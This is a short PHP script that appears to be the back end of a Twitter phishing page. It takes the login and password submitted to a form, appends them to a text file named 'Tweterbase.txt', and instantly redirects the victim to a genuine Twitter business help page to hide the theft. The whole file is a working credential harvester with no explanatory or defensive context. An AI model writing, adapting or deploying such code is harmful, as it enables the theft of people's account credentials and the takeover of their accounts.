<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("Tweterbase.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://business.twitter.com/help/how-twitter-ads-work'></head></html>";
?>